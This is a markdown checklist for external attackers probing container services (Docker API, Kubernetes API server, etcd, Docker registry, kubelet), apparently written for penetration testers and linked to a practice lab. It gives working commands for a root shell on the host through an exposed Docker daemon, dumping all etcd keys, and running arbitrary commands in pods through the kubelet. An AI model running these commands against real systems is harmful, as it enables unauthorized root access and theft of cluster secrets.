# External Attacker Checklist

External attackers are typically looking for listening services. The list below is likely container related service ports and notes on testing/attacking them.

## 2375/TCP - Docker

This is the default insecure Docker port. It's an HTTP REST API, and usually access results in root on the host.

### Testing with Docker CLI

The easiest way to attack this is just use the docker CLI.

* `docker run -H tcp://[IP]:2375 info` - This will confirm access and return some information about the host
* `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - From [this](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) post. This will drop you into a root shell on the host.

---

## 2376/TCP - Docker

This is the default port for the Docker daemon where it requires credentials (client certificate), so you're unlikely to get far without that. If you do have the certificate and key for access :-

* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 info` - format for the info command to confirm access.
* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - root on the host

---

## 443/TCP, 6443/TCP, 8443/TCP - Kubernetes API server

Typical ports for the Kubernetes API server.

### Testing for access

Access to the `/version` endpoint will often work without valid credentials (using curl), as this is made available to unauthenticated users.

* `kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:[PORT] version` - Test for access with kubectl
* `curl -k https://[IP]:[PORT]/version` - Test for access with curl

### Checking permissions

It's possible that unauthenticated users have been provided more access. You can check what permissions you have with

* `kubectl --insecure-skip-tls-verify --username=system:unauthenticated -shttps://[IP]:[PORT] auth can-i --list`

### Getting privileged access to cluster nodes

In the event that you have create pods access without authentication, see [attacker manifests](attacker_manifests.md) for useful approaches.

---

## 2379/TCP - etcd

The authentication model used by etcd, when supporting a Kubernetes cluster, is relatively straightforward. It uses client certificate authentication where **any** certificate issued by it's trusted CA will provide full access to all data. In terms of attacks, there are two options unauthenticated access and authenticated acces.

### Unauthenticated Access
**You can try out this attack using Kube Security Lab, using the etcd-noauth.yml playbook [here](https://github.com/raesene/kube_security_lab)**

A good general test for this is to use curl to access the `/version` endpoint. Although most endpoints don't respond well to curl in etcdv3, this one will and it'll tell you whether unauthenticated access is possible or not.

```bash
curl [IP]:2379/version
```

If that returns version information, it's likely you can get unauthenticated access to the database. A good first step is to drop all the keys in the database, using etcdctl. First you need to set this environment variable so that etcdctl knows it's talking to a v3 server.

```bash
export ETCDCTL_API=3
```

Then this command will enumerate all the keys in  the database

```bash
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get / --prefix --keys-only
```

with a list of keys to hand the next step is generally to find useful information, for further attacks.

---

## 5000/TCP - Docker Registry

Generally the goal of attacking a Docker registry is not to compromise the service itself, but to gain access to either read sensitive information stored in container images and/or modify stored container images.

### Enumerating repositories/images

Whilst you can do this with just curl, it's probably more efficient to use some of the [registry interaction tools](tools_list.md#container-registry-tooling). For example  `go-pillage-reg` will dump a list of the repositories in a a registry as well as the details of all the manifests of those images.


---

## 10250/TCP - kubelet
**You can try out this attack using Kube Security Lab, using the rwkubelet-noauth.yml playbook [here](https://github.com/raesene/kube_security_lab)**

The main kubelet port will generally be present on all worker nodes, and *may* be present on control plane nodes, if the control plane components are deployed as containers (e.g. with kubeadm). Usually authentication to this port is via client certificates and there's usually no authorization in place.

Trying the following request should either give a 401 (showing that a valid client certificate is required) or return some JSON metrics information (showing you have access to the kubelet port)

```bash
curl -k https://[IP]:10250/metrics
```

Assuming you've got access you can then execute commands in any container running on that host. As the kubelet controls the CRI (e.g. Docker) it's typically going to provide privileged access to all the containers on the host.

The easiest way to do this is to use Cyberark's [kubeletctl](https://github.com/cyberark/kubeletctl). First scan the host to show which pods can have commands executed in them

```bash
kubeletctl scan rce --server [IP]
```

Then you can use this command to execute commands in one or more of the vulnerable pods. just replace `whoami` with the command of your choice and fill in the details of the target pod, based on the information returned from the scan command

```bash
 kubeletctl run "whoami" --namespace [NAMESPACE] --pod [POD] --container [CONTAINER] --server [IP]
```

If you don't have `kubeletctl` available but do have `curl` you can use it to do the same thing. First get the pod listing

```bash
curl -k https://[IP]:10250/pods/ | jq
```

From that pull out the namespace, pod name and container name that you want to run a command in, then issue this command filling in the blanks appropriately

```bash
https://[IP]:10250/run/[Namespace]/[Pod]/[Container] -k -XPOST -d "cmd=[COMMAND]"
```

---

## 10255/TCP - kubelet read-only

The kubelet read-only port is generally only seen on older clusters, but can provide some useful information disclosure if present. It's an HTTP API which will have no encryption and no authentication requirements on it, so it's easy to interact with.

The most useful endpoint will be `/pods/` so retrieving it using curl (as below) and looking at the output for useful information, is likely to be the best approach.


```bash
curl http://[IP]:10255/pods/ | jq
```